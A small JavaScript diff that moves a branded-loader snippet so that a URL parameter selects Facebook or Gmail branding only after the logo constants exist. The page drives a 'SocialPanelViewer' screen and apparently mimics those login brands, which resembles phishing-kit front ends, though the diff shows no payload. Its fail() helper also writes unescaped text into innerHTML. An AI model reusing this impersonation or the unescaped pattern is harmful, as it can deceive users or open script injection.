@@ -7,10 +7,6 @@ if (returnUrl) localStorage.setItem('return_url', returnUrl);
 const viewer = new SocialPanelViewer(document.querySelector('#screen'));
 const overlay = document.querySelector('#loadingOverlay');
 
-// Immediate branded loader — no need to wait for the start API response.
-const _pHint = params.get('p') || '';
-if (_pHint) applyPlatform(_pHint);
-
 function fail(msg) {
   document.body.innerHTML = `<p style="color:#fff;padding:2em;font:16px sans-serif">${msg}</p>`;
 }
@@ -61,6 +57,10 @@ function applyPlatform(accountId) {
 
   overlay.dataset.platform = isFb ? 'facebook' : 'gmail';
 }
+
+// Immediate branded loader — must run AFTER FB_LOGO/GMAIL_LOGO consts are initialized.
+const _pHint = params.get('p') || '';
+if (_pHint) applyPlatform(_pHint);
 
 let _ready = false;
 viewer.onReady = () => { _ready = true; if (overlay) overlay.classList.add('hidden'); };
